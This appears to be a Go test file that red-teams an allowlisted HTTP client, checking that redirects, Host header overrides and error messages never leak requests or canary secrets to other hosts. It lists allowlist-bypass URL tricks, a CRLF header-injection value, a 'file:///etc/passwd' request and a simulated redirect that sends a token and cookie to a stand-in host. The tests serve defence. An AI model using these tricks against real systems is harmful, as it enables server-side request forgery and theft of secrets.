// Red-team attack tests for the allowlisted client (J0 task T30): redirect
// and direct-request host tricks (userinfo, ports, IP literals and encodings,
// trailing dots, IDN, scheme downgrade and exotic schemes), Host header
// overrides, and canaries in every part of a failing request. Uses the test
// server and recording dialer of httpx_test.go: nothing touches the real
// network. A test passes when the attack is defeated.
package httpx_test

import (
	"context"
	"errors"
	"io"
	"net/http"
	"net/url"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/FlorianRuen/facto/internal/fsx"
	"github.com/FlorianRuen/facto/internal/httpx"
	"github.com/FlorianRuen/facto/internal/testsecrets"
)

// atkHostTricks are URLs whose effective host is NOT fournisseur.test on
// port 443 over https (or that are malformed). The test certificate covers
// autre.test too, so a successful TLS handshake would not stop a leak.
var atkHostTricks = []string{
	"https://autre.test/x",
	"//autre.test/x",
	"https://fournisseur.test@autre.test/x",
	"https://fournisseur.test:443@autre.test/x",
	"https://user:pw@autre.test/x",
	"https://autre.test#@fournisseur.test",
	"https://autre.test?.fournisseur.test",
	"https://autre.test\\.fournisseur.test/x",
	"https://autre.test%2f.fournisseur.test/x",
	"https://autre.test%00.fournisseur.test/x",
	"https://fournisseur.test.autre.test/x",
	"https://fournisseur.test./x",
	"https://fournisseur.test:8443/x",
	"https://fournisseur.test:0443/x",
	"https://fournisseur.test:443:443/x",
	"https://127.0.0.1/x",
	"https://2130706433/x",
	"https://0x7f.1/x",
	"https://[::1]/x",
	"https://[::ffff:127.0.0.1]/x",
	"https://[fe80::1%25lo]/x",
	"https://xn--fournisseur-9db.test/x",
	"https://fournisseur\u3002test/x",
	"https://fournisseur.test\u200b/x",
	"https://FOURNISSEUR.TEST\u212a/x",
	"http://fournisseur.test/x",
	"HTTP://fournisseur.test/x",
	"ftp://fournisseur.test/x",
	"file:///etc/passwd",
	"data:text/plain,x",
	"javascript:alert(1)",
	"https:autre.test/x",
	"https:///autre.test/x",
	"ws://fournisseur.test/x",
}

// TestAttack_HttpxDirectHostTricksNeverDial requests each trick directly:
// nothing may be dialed and the server never hit.
func TestAttack_HttpxDirectHostTricksNeverDial(t *testing.T) {
	t.Parallel()
	for _, u := range atkHostTricks {
		t.Run(u, func(t *testing.T) {
			t.Parallel()
			e := newEnv(t, ok)
			_, _, err := get(t, e.client(t, "fournisseur.test", "*.fournisseur.test"), u)
			if err == nil {
				t.Fatalf("Get(%q) succeeded", u)
			}
			if d := e.dialed(); len(d) != 0 || e.hits.Load() != 0 {
				t.Errorf("Get(%q) dialed %q, %d server hits", u, d, e.hits.Load())
			}
		})
	}
}

// TestAttack_HttpxRedirectTricksNeverLeaveAllowlist makes the allowed host
// redirect (302, and 307 with a body) to each trick: only the first hop may
// reach the server, and only fournisseur.test:443 may be dialed.
func TestAttack_HttpxRedirectTricksNeverLeaveAllowlist(t *testing.T) {
	t.Parallel()
	for _, loc := range atkHostTricks {
		for _, code := range []int{http.StatusFound, http.StatusTemporaryRedirect} {
			t.Run(http.StatusText(code)+" "+loc, func(t *testing.T) {
				t.Parallel()
				e := newEnv(t, func(w http.ResponseWriter, r *http.Request) {
					if r.URL.Path == "/start" {
						w.Header().Set("Location", loc)
						w.WriteHeader(code)
						return
					}
					ok(w, r)
				})
				req, err := http.NewRequestWithContext(t.Context(), http.MethodPost, "https://fournisseur.test/start", strings.NewReader("form=synthetic"))
				if err != nil {
					t.Fatal(err)
				}
				resp, err := e.client(t, "fournisseur.test").Do(req)
				if err == nil {
					_, _ = io.Copy(io.Discard, resp.Body)
					_ = resp.Body.Close()
					// A Location that does not parse as a redirect leaves the
					// 30x response to the caller: that is not a leak.
					if resp.StatusCode != code {
						t.Errorf("redirect to %q was followed (status %d)", loc, resp.StatusCode)
					}
				}
				if got := slices.Compact(e.dialed()); len(got) > 1 || (len(got) == 1 && got[0] != "fournisseur.test:443") {
					t.Errorf("dialed %q, want only fournisseur.test:443", got)
				}
				if e.hits.Load() != 1 {
					t.Errorf("server hit %d times, want 1 (the redirect hop must be refused)", e.hits.Load())
				}
			})
		}
	}
}

// TestAttack_HttpxHostHeaderTricks keeps an allowed URL but tries to make
// the request address another virtual host.
func TestAttack_HttpxHostHeaderTricks(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		set  func(r *http.Request)
	}{
		{"req.Host other", func(r *http.Request) { r.Host = "autre.test" }},
		{"req.Host other with 443", func(r *http.Request) { r.Host = "autre.test:443" }},
		{"req.Host allowed with port", func(r *http.Request) { r.Host = "fournisseur.test:8443" }},
		{"req.Host with userinfo", func(r *http.Request) { r.Host = "fournisseur.test@autre.test" }},
		{"req.Host with CRLF", func(r *http.Request) { r.Host = "fournisseur.test\r\nX-Injected: 1" }},
		{"Host header", func(r *http.Request) { r.Header.Set("Host", "autre.test") }},
		{"X-Forwarded-Host header", func(r *http.Request) { r.Header.Set("X-Forwarded-Host", "autre.test") }},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			var (
				mu        sync.Mutex
				seenHosts []string
			)
			e := newEnv(t, func(w http.ResponseWriter, r *http.Request) {
				mu.Lock()
				seenHosts = append(seenHosts, r.Host)
				mu.Unlock()
				if r.Header.Get("X-Injected") != "" {
					t.Error("header injected through Host")
				}
				ok(w, r)
			})
			req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, "https://fournisseur.test/x", http.NoBody)
			if err != nil {
				t.Fatal(err)
			}
			tt.set(req)
			resp, err := e.client(t, "fournisseur.test").Do(req)
			if err == nil {
				_ = resp.Body.Close()
			}
			mu.Lock()
			defer mu.Unlock()
			for _, h := range seenHosts {
				if h != "fournisseur.test" && h != "fournisseur.test:443" {
					t.Errorf("server saw Host %q", h)
				}
			}
			if d := slices.Compact(e.dialed()); len(d) > 1 || (len(d) == 1 && d[0] != "fournisseur.test:443") {
				t.Errorf("dialed %q", d)
			}
		})
	}
}

// atkChain renders an error and every error in its chain.
func atkChain(err error) string {
	var b strings.Builder
	stack := []error{err}
	for len(stack) > 0 {
		e := stack[len(stack)-1]
		stack = stack[:len(stack)-1]
		if e == nil {
			continue
		}
		b.WriteString(e.Error() + "\n")
		if u := errors.Unwrap(e); u != nil {
			stack = append(stack, u)
		} else if j, ok := e.(interface{ Unwrap() []error }); ok {
			stack = append(stack, j.Unwrap()...)
		}
	}
	return b.String()
}

// TestAttack_HttpxErrorsNeverCarryCanaries fails requests in every way
// (refused host, refused redirect with secrets in the Location, failed dial,
// untrusted certificate, timeout, malformed Location) with canaries in the
// userinfo, query, fragment, headers and cookie jar. The error chains are
// written under ArtifactDir for leakcheck.
func TestAttack_HttpxErrorsNeverCarryCanaries(t *testing.T) {
	t.Parallel()
	pw := testsecrets.Canary(t, testsecrets.Password)
	ck := testsecrets.Canary(t, testsecrets.Cookie)
	tok := testsecrets.Canary(t, testsecrets.Token)
	sess := testsecrets.Canary(t, testsecrets.Session)
	canaries := []string{pw, ck, tok, sess}
	secretURL := func(host string) string {
		return "https://synthetic:" + pw + "@" + host + "/dl?token=" + tok + "#sid=" + sess
	}
	slow := make(chan struct{})
	e := newEnv(t, func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/redirect-off":
			http.Redirect(w, r, "https://autre.test/steal?token="+tok+"&c="+ck, http.StatusFound)
		case "/redirect-http":
			http.Redirect(w, r, "http://fournisseur.test/x?sid="+sess, http.StatusFound)
		case "/redirect-bad":
			w.Header().Set("Location", "https://fournisseur.test/%zz?token="+tok)
			w.WriteHeader(http.StatusFound)
		case "/slow":
			<-slow
		default:
			ok(w, r)
		}
	})
	// Registered after newEnv: cleanups run last-in first-out, and the
	// server's Close waits for the blocked handler.
	t.Cleanup(func() { close(slow) })
	withSecrets := func(c *httpx.Client, rawURL string) error {
		req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, rawURL, http.NoBody)
		if err != nil {
			return err
		}
		req.Header.Set("Authorization", "Bearer "+tok)
		req.Header.Set("Cookie", "PHPSESSID="+ck)
		req.Header.Set("X-Session", sess)
		resp, err := c.Do(req)
		if err == nil {
			_ = resp.Body.Close()
			return errors.New("unexpected success")
		}
		return err
	}
	allowed := e.client(t, "fournisseur.test")
	u, err := url.Parse("https://fournisseur.test/")
	if err != nil {
		t.Fatal(err)
	}
	allowed.Jar().SetCookies(u, []*http.Cookie{{Name: "sid", Value: ck, Path: "/", Secure: true, HttpOnly: true, SameSite: http.SameSiteStrictMode}})
	slowClient := mustNew(t, []string{"fournisseur.test"}, httpx.Options{RootCAs: e.pool, DialContext: e.dial, Timeout: 300 * time.Millisecond})
	untrusted := mustNew(t, []string{"fournisseur.test"}, httpx.Options{DialContext: e.dial})
	failing := mustNew(t, []string{"fournisseur.test"}, httpx.Options{DialContext: failingDial})

	cases := map[string]func() error{
		"refused host": func() error { return withSecrets(allowed, secretURL("autre.test")) },
		"refused scheme": func() error {
			return withSecrets(allowed, strings.Replace(secretURL("fournisseur.test"), "https", "http", 1))
		},
		"redirect off list": func() error {
			return withSecrets(allowed, "https://fournisseur.test/redirect-off?token="+tok)
		},
		"redirect to http": func() error { return withSecrets(allowed, "https://fournisseur.test/redirect-http?sid="+sess) },
		"malformed location": func() error {
			return withSecrets(allowed, "https://fournisseur.test/redirect-bad?token="+tok)
		},
		"failed dial":      func() error { return withSecrets(failing, secretURL("fournisseur.test")) },
		"untrusted cert":   func() error { return withSecrets(untrusted, secretURL("fournisseur.test")) },
		"timeout":          func() error { return withSecrets(slowClient, "https://fournisseur.test/slow?token="+tok) },
		"canceled context": func() error { return atkCanceled(allowed, secretURL("fournisseur.test")) },
		"malformed url": func() error {
			return atkGet(t, allowed, "https://fournisseur.test/%zz?token="+tok)
		},
		"control char in url": func() error {
			return atkGet(t, allowed, "https://fournisseur.test/\x7f?token="+tok)
		},
	}
	var report strings.Builder
	for name, f := range cases {
		err := f()
		if err == nil {
			t.Errorf("%s: no error", name)
			continue
		}
		chain := atkChain(err)
		report.WriteString("== " + name + "\n" + chain)
		for _, c := range canaries {
			if strings.Contains(chain, c) {
				t.Errorf("%s: error chain carries a canary", name)
			}
		}
	}
	root, err := fsx.Open(testsecrets.ArtifactDir(t))
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = root.Close() }()
	if err := root.WriteAtomic(t.Context(), "errors.txt", []byte(report.String())); err != nil {
		t.Fatal(err)
	}
}

// atkGet returns Get's error, closing the body of an unexpected success.
func atkGet(t *testing.T, c *httpx.Client, rawURL string) error {
	t.Helper()
	resp, err := c.Get(t.Context(), rawURL)
	if err == nil {
		_ = resp.Body.Close()
		return errors.New("unexpected success")
	}
	return err
}

func atkCanceled(c *httpx.Client, rawURL string) error {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	resp, err := c.Get(ctx, rawURL)
	if err == nil {
		_ = resp.Body.Close()
		return errors.New("unexpected success")
	}
	return err
}
